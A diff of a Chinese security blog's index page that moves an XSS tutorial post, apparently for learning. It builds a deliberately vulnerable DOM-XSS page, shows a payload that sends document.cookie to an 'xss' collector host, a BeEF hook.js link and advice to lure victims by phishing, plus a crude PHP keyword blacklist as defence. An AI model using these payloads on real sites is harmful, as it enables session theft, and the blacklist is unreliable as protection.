@@ -433,212 +433,6 @@ window.onmouseout = function () {
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Darren-zl">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Darren-学无止境">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/24/web安全之XSS漏洞学习实战/" itemprop="url">Untitled</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T14:57:52+08:00">
-                2020-03-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2020/03/24/web安全之XSS漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/" class="cy_cmt_count" data-xid="2020/03/24/web安全之XSS漏洞学习实战/" itemprop="commentsCount"></span>
-                </a>
-              
-            
-          
-
-          
-          
-             <span id="/2020/03/24/web安全之XSS漏洞学习实战/" class="leancloud_visitors" data-flag-title>
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Visitors&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </span></div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-
-      
-      
-
-      
-        
-          
-            <h2 id="web安全之XSS漏洞学习实战"><a href="#web安全之XSS漏洞学习实战" class="headerlink" title="web安全之XSS漏洞学习实战"></a>web安全之XSS漏洞学习实战</h2><h3 id="1-编写一个存在XSS漏洞的页面"><a href="#1-编写一个存在XSS漏洞的页面" class="headerlink" title="1.编写一个存在XSS漏洞的页面"></a>1.编写一个存在XSS漏洞的页面</h3><p>编写一个dom形xss。首先html页面：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length))); </span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.URL表示返回当前页面的URL   2.indexOf表示回某个指定的字符串值在字符串中首次出现的位置。   pos=74(url长度)+5</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.write表示输出内容  2.decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码，decodeURI为解码。 </span></span></span><br><span class="line"><span class="javascript"><span class="comment">//3.substring() 方法用于提取字符串中介于两个指定下标之间的字符。substring() 方法返回的子串包括 开始 处的字符，但不包括 结束 处的字符。</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>验证：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png" alt="1578539018013"></p>
-<h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2.利用XSS"></a>2.利用XSS</h3><p>存在xss漏洞的页面上只需</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>便可以获取到当前用户的cookie。</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png" alt="1578540177735"></p>
-<p>如果对方漏洞为存储型XSS，并且你搭建了xss获取cookie的平台那么只需将下面代码插入漏洞页面中，便可以在cookie平台中获取到对方的cookie。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">'http://xss/cookie.asp?msg='</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-利用XSS漏洞还可以做什么。"><a href="#3-利用XSS漏洞还可以做什么。" class="headerlink" title="3.利用XSS漏洞还可以做什么。"></a>3.利用XSS漏洞还可以做什么。</h3><p>3.1 可以在beef上把目标的浏览器作为代理进行操作，可以进行DNS污染等等。</p>
-<p>3.2 可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。</p>
-<p>3.3 结合metasploit进一步获取权限。</p>
-<p>首先在Beef里构造一个存在漏洞的页面，如下：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png" alt="1578540339135"></p>
-<p>然后利用邮件钓鱼等多种方式诱导用户访问含有XSS漏洞页面：</p>
-<p>如： <a href="http://127.0.0.1/domxss.html?name=" target="_blank" rel="noopener">http://127.0.0.1/domxss.html?name=</a><script src="http://192.168.5.54:3000/hook.js"></script></p>
-<p>用户点击以后便直接上线：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png" alt="1578540669070"></p>
-<p>然后就可以做很多事件：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png" alt="1578540698882"></p>
-<h3 id="4-如何防御XSS"><a href="#4-如何防御XSS" class="headerlink" title="4.如何防御XSS"></a>4.如何防御XSS</h3><p>xss的防御主要还是集中在代码层，需要过滤非法字符。需要对输入内容进行过滤，输出内容进行编码。</p>
-<p>针对php可以用如下代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($str)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $str = htmlspecialchars($str);</span><br><span class="line">    $str = str_replace( <span class="string">'/'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'('</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">')'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'CR'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0d'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'LF'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0a'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">','</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'%'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">';'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'eval'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'open'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'sysopen'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'system'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'$'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x08'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">""</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;gt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;lt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"join"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"union"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"where"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"like"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"drop"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"DROP"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"modify"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"rename"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"alter"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"cas"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">32</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"    "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,chr(<span class="number">34</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'"</span>,chr(<span class="number">39</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;br /&gt;"</span>,chr(<span class="number">13</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"''"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"css"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CSS"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;!--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"convert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"md5"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"passwd"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"password"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"../"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"Array"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"or 1='1'"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";set|set&amp;set;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`set|set&amp;set`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"OR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"*"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"+"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" -- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" --"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"response"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"write"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"|"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"etc"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"root"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"//"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"!="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"$"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"=="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"@"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"mailto:"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CHAR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>将非法字符都过滤掉可以一定程度上防止XSS也可以防止SQL注入。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-
-    
-
-    
-
-    
-
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -825,6 +619,212 @@ window.onmouseout = function () {
 <p>然后数据也会传到Grafana中：</p>
 <p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200323144159835.png" alt="image-20200323144159835"></p>
 <h5 id="代码下载链接见："><a href="#代码下载链接见：" class="headerlink" title="代码下载链接见："></a>代码下载链接见：</h5><p><a href="https://github.com/Darren-zl/sonarqube-san" target="_blank" rel="noopener">https://github.com/Darren-zl/sonarqube-san</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/web安全之XSS漏洞学习实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/17/web安全之XSS漏洞学习实战/" itemprop="url">web安全之XSS漏洞学习实战</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-17T14:55:34+08:00">
+                2020-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/01/17/web安全之XSS漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://yoursite.com/2020/01/17/web安全之XSS漏洞学习实战/" class="cy_cmt_count" data-xid="2020/01/17/web安全之XSS漏洞学习实战/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/01/17/web安全之XSS漏洞学习实战/" class="leancloud_visitors" data-flag-title="web安全之XSS漏洞学习实战">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        
+          
+            <h2 id="web安全之XSS漏洞学习实战"><a href="#web安全之XSS漏洞学习实战" class="headerlink" title="web安全之XSS漏洞学习实战"></a>web安全之XSS漏洞学习实战</h2><h3 id="1-编写一个存在XSS漏洞的页面"><a href="#1-编写一个存在XSS漏洞的页面" class="headerlink" title="1.编写一个存在XSS漏洞的页面"></a>1.编写一个存在XSS漏洞的页面</h3><p>编写一个dom形xss。首先html页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	var pos=document.URL.indexOf("name=")+5;</span><br><span class="line">	document.write(decodeURI(document.URL.substring(pos,document.URL.length))); </span><br><span class="line">//1.document.URL表示返回当前页面的URL   2.indexOf表示回某个指定的字符串值在字符串中首次出现的位置。   pos=74(url长度)+5</span><br><span class="line">//1.document.write表示输出内容  2.decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码，decodeURI为解码。 </span><br><span class="line">//3.substring() 方法用于提取字符串中介于两个指定下标之间的字符。substring() 方法返回的子串包括 开始 处的字符，但不包括 结束 处的字符。</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>验证：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png" alt="1578539018013"></p>
+<h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2.利用XSS"></a>2.利用XSS</h3><p>存在xss漏洞的页面上只需</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>便可以获取到当前用户的cookie。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png" alt="1578540177735"></p>
+<p>如果对方漏洞为存储型XSS，并且你搭建了xss获取cookie的平台那么只需将下面代码插入漏洞页面中，便可以在cookie平台中获取到对方的cookie。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>window.open('http://xss/cookie.asp?msg='+document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用XSS漏洞还可以做什么。"><a href="#3-利用XSS漏洞还可以做什么。" class="headerlink" title="3.利用XSS漏洞还可以做什么。"></a>3.利用XSS漏洞还可以做什么。</h3><p>3.1 可以在beef上把目标的浏览器作为代理进行操作，可以进行DNS污染等等。</p>
+<p>3.2 可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。</p>
+<p>3.3 结合metasploit进一步获取权限。</p>
+<p>首先在Beef里构造一个存在漏洞的页面，如下：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png" alt="1578540339135"></p>
+<p>然后利用邮件钓鱼等多种方式诱导用户访问含有XSS漏洞页面：</p>
